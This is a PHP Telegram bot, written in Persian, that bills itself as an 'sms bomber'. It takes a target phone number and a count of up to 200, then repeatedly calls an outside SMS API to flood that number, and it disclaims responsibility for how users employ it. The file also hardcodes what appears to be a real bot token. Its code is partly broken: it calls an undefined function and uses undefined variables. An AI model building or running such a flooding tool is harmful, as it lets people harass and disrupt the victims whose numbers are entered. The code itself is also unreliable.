<?php
define('API_KEY','7368172321:AAEwbLMWuo_C_ghVktVRcX3YkpzcXMBaV_Y');
function HACKGM($method,$datas=[]){
    $url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
#function
function sendmsg($user_id,$txt_msg,$msg_id,$key = null) {
SLTAN_HKBLVC2017('sendmessage', [
'chat_id'=>$user_id, 
'text'=>$txt_msg, 
'reply_to_message_id'=>$msg_id,
'reply_markup'=>$key,
]);
}
#variables
$get = json_decode(file_get_contents('php://input'));
$txt_msg = $get->message->text;
$user_id = $get->message->from->id;
$msg_id = $get->message->message_id;
mkdir("data/$chat_id");
#data
$fox = file_get_contents("data/$user_id/sms.txt");
$fox5 = file_get_contents("data/$user_id/sms5.txt");
$fox30 = file_get_contents("data/$user_id/sms30.txt");
$fox80 = file_get_contents("data/$user_id/sms80.txt");
$fox100 = file_get_contents("data/$user_id/sms100.txt");
$fox130 = file_get_contents("data/$user_id/sms130.txt");
$fox150 = file_get_contents("data/$user_id/sms150.txt");
$fox180 = file_get_contents("data/$user_id/sms180.txt");
$fox200 = file_get_contents("data/$user_id/sms200.txt");
#menu
$menu = json_encode([
'keyboard'=>[
[['text'=>'😈 اسپم شماره 😈']],
[['text'=>'🚦 راهنما'],['text'=>'▫️ کانال ما ▫️']],
],"resize_keyboard"=>true]);
#back
$back = json_encode([
'keyboard'=>[
[['text'=>'🔙 بازگشت به منوی قبلی']],
],"resize_keyboard"=>true]);
mkdir("data");
mkdir("data/$user_id");
#select
$select = json_encode([
'keyboard'=>[
[['text'=>'5 تا تستی 😂']],
[['text'=>'🗃 30 عدد'],['text'=>'🗃 50 عدد️']],
[['text'=>'🗃 80 عدد'],['text'=>'🗃 100 عدد️']],
[['text'=>'🗃 130 عدد'],['text'=>'🗃150 عدد️']],
[['text'=>'🗃 180 عدد'],['text'=>'🗃 200 عدد️']],
[['text'=>'🔙 بازگشت به منوی قبلی']],
],"resize_keyboard"=>true]);
#start
if($txt_msg == "/start" or $txt_msg == "🔙 بازگشت به منوی قبلی") {
file_put_contents("data/$user_id/sms.txt","none");
		$user = file_get_contents('Member.txt');
	$members = explode("\n",$user);
	if(!in_array($chat_id,$members)){
		$add_user = file_get_contents('Member.txt');
		$add_user .= $chat_id."\n";
		file_put_contents('Member.txt',$add_user);
	}
sendmsg($user_id,"سلام کاربر گرامی

 به ربات sms bomber خوش امدید 💚

با این ربات میتوانید به راحتی هر شماره ای را که دوست دارید پیام بصورت اسپم ارسال کنید 😁😂

🔺 مسولیت استفاده از این ربات بر عهده خودتان است 🔻

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id,$menu);
}
#spam
if($txt_msg=="😈 اسپم شماره 😈") {
file_put_contents("data/$user_id/sms.txt","none");
sendmsg($user_id,"✨ در این مرحله تعدادی پیام هایی که میخواهید به کاربر ارسال
شود را از منوی زیر انتخاب کنید:

🔻 مسولیت استفاده برعهده خودتان است 🔻",$msg_id,$select);
}
if($txt_msg=="5 تا تستی 😂") {
file_put_contents("data/$user_id/sms5.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox5 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms5.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال 5 عدد پیام تستی به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 5; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id,"5 عدد پیام برای تست به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
if($txt_msg=="🗃 30 عدد") {
file_put_contents("data/$user_id/sms30.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox30 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms30.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 30 عدد پیام  به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 30; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 30 عدد پیام  به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
if($txt_msg=="🗃 50 عدد") {
file_put_contents("data/$user_id/sms50.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox50 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms50.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 50 عدد پیام  به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 50; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 50 عدد پیام به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//===================================//
if($txt_msg=="🗃 80 عدد") {
file_put_contents("data/$user_id/sms80.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox80 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms80.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 80 عدد پیام به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 80; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 80 عدد پیام برای به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//========================================//
if($txt_msg=="🗃 100 عدد") {
file_put_contents("data/$user_id/sms100.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox100 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms100.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 100 عدد پیام به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 100; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 100 عدد پیام به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//=========================================//
if($txt_msg=="🗃 130 عدد") {
file_put_contents("data/$user_id/sms130.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox130 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms130.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 130 عدد پیام به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 130; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 130 عدد پیام به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//========================================//
if($txt_msg=="🗃 150 عدد") {
file_put_contents("data/$user_id/sms150.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox150 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms150.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 150 عدد پیام به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 150; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 150 عدد پیام به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//========================================//
if($txt_msg=="🗃 180 عدد") {
file_put_contents("data/$user_id/sms180.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox180 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms180.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 180 عدد پیام به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 180; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 180 عدد پیام به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//========================================//
if($txt_msg=="🗃 200 عدد") {
file_put_contents("data/$user_id/sms200.txt","attack");
sendmsg($user_id,"✨شماره فردی را که میخواهید پیام ها به او ارسال شوند را رسال کنید :

❗️ برای مثال:
09123456789",$msg_id,$back);
}
elseif($fox200 == "attack"&&$txt_msg!="🔙 بازگشت به منوی قبلی") {
if(is_numeric($txt_msg)) {
file_put_contents("data/$user_id/sms200.txt","none");
sendmsg($user_id,"🔗 شروع فرایند ارسال  🗃 200 عدد پیام تستی به شماره ارسال شده ❗️

📍  نتیجه ارسال بزودی برای شما ارسال میشود ✔️",$msg_id);
for($i=1; $i <= 200; $i++) {
file_get_contents("https://qpdb6.com/api/sms/hgyv-fyfh2578-53fdrn-6a.php?tel=$txt_msg");
}
sendmsg($user_id," 🗃 200 عدد پیام  به شماره $txt_msg ارسال شد ✅

🌟 کانال ما:
🆔 @SLTAN_HKBLVC2017",$msg_id);}
 else {
sendmsg($user_id,"❗️لطفا شماره را بصورت عدد ارسال کنید️",$msg_id);}
}
//========================================//
if($txt_msg=="🚦 راهنما") {
sendmsg($user_id,"راهنمای استفاده از ربات:

کار با ربات بسیار اسان است فقط کافی است

که شما شماره فرد مورد نظرتون رو به ربات بدبد و میزان پیام را نیز مشخص کنید

ربات بصورت خودکار به مقدار تعیین شده به شماره ارسالی شما

پیامک از سمت api ارسال خواهد کرد

موفق باشید",$msg_id,$back);
}
if($txt_msg=="▫️ کانال ما ▫️") {
sendmsg($user_id,"کانال سورس  خونه
برای دریافت سورس  ، وب سرویس  ،قالب و... به کانال مامراجعه کنید

و همچنین برای  پیشرفت کردن در عرصه های برنامه نویسی .. عضو کانال بشید

🆔 @SLTAN_HKBLVC2017",$msg_id,$back);
}
?>